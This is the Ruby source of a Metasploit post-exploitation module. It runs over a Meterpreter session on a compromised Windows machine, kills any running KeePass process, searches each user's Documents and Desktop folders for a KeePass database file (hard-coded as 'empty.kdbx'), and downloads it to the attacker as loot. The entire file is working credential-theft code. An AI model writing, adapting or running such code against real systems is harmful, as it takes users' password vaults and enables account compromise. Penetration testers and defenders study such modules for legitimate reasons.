# $Id: keepass_jacker.rb 2012-05-01 rapid7 $

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/user_profiles'

class Metasploit3 < Msf::Post
	include Msf::Auxiliary::Report
	include Msf::Post::Windows::UserProfiles

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Windows Keepass Database Finder',
				'Description'   => %q{
					This module downloads any keepass kdbx files that it finds
				},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'balgan <balgan[at]balgan.eu>'],
				'Version'       => '$Revision: 3195e713 $',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
	end

	def run
		print_status("Checking All Users Documents Folders For Keepass Files...")
		print_status("Attempting to kill keepass")
		kill_keepass()
		grab_user_profiles().each do |user|
			next if user['MyDocs'] == nil
			tmpath= user['MyDocs'] + "\\empty.kdbx"
			print_status("Retrieving:" + tmpath)
			jack_keepass(tmpath)
			next if user['Desktop'] == nil
			tmpath= user['Desktop'] + "\\empty.kdbx"
			print_status("Retrieving:" + tmpath)
			jack_keepass(tmpath)
			
		end
	end

	def jack_keepass(filename)
		data     = ""
		found    = session.fs.file.stat(filename) rescue nil
		return if not found
		print_status("Keepass Database Found At #{filename}")
		print_status("     Retrieving keepass file...")

		begin
			wallet = session.fs.file.new(filename, "rb")
			until wallet.eof?
				data << wallet.read
			end
			store_loot("keepass.kdbx", "application/octet-stream", session, data, filename, "Keepass database")
		rescue ::Interrupt
			raise $!
		rescue ::Exception => e
			print_error("Failed to download #{filename}: #{e.class} #{e}")
		end
	end

	def kill_keepass
		client.sys.process.get_processes().each do |x|
			if x['name'].downcase == "keepass.exe"
				print_status("     Keepass Process Found...")
				print_status("     Killing Process PID #{x['pid']}...")
				session.sys.process.kill(x['pid']) rescue nil
			end
		end
	end

end
